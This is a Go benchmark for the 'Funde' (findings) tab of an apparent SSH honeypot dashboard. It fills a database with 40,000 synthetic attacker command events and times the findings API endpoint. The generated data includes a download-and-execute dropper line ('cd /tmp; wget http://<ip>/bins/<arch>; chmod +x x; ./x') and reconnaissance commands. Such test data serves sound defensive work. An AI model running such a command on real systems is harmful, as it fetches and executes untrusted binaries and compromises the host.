package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http/httptest"
	"testing"
	"time"
)

// Lasttest für den Tab „Funde“: 40.000 Befehle mit Nachlade-Adressen über 25 Tage.
//
//	go test -run '^$' -bench Funde -benchtime 5x
func BenchmarkFunde(b *testing.B) {
	h := testHive(b)
	h.share.load(h.st)
	r := rand.New(rand.NewSource(1))
	ip := func() string {
		return fmt.Sprintf("%d.%d.%d.%d", 31+r.Intn(190), 1+r.Intn(254), 1+r.Intn(254), 1+r.Intn(254))
	}
	hosts := make([]string, 300)
	for i := range hosts {
		hosts[i] = ip()
	}
	ips := make([]string, 2000)
	for i := range ips {
		ips[i] = ip()
	}
	archs := []string{"arm", "arm7", "mips", "mpsl", "x86", "x86_64"}
	now := time.Now()
	tx, _ := h.st.db.Begin()
	for i := 0; i < 40000; i++ {
		cmd := fmt.Sprintf("cd /tmp; wget http://%s/bins/%s; chmod +x x; ./x", hosts[r.Intn(len(hosts))], archs[r.Intn(len(archs))])
		if i%3 == 0 {
			cmd = "uname -a; cat /proc/cpuinfo"
		}
		d, _ := json.Marshal(map[string]string{"input": cmd})
		tx.Exec(`INSERT INTO events(ts,type,src_ip,service,sensor,session,country,as_org,data) VALUES(?,?,?,?,?,?,?,?,?)`,
			now.Add(-time.Duration(r.Int63n(int64(25*24*time.Hour)))).UnixMilli(), "command", ips[r.Intn(len(ips))], "ssh", "", fmt.Sprintf("s%d", r.Intn(20000)), "DE", "Hoster", string(d))
	}
	tx.Commit()
	t0 := time.Now()
	rec := httptest.NewRecorder()
	h.funde(rec, httptest.NewRequest("GET", "/api/funde?range=30d", nil))
	b.Logf("erster Aufruf (Zwischenspeicher leer): %v", time.Since(t0))
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		rec := httptest.NewRecorder()
		h.funde(rec, httptest.NewRequest("GET", "/api/funde?range=30d", nil))
		if rec.Code != 200 {
			b.Fatal(rec.Code)
		}
	}
}
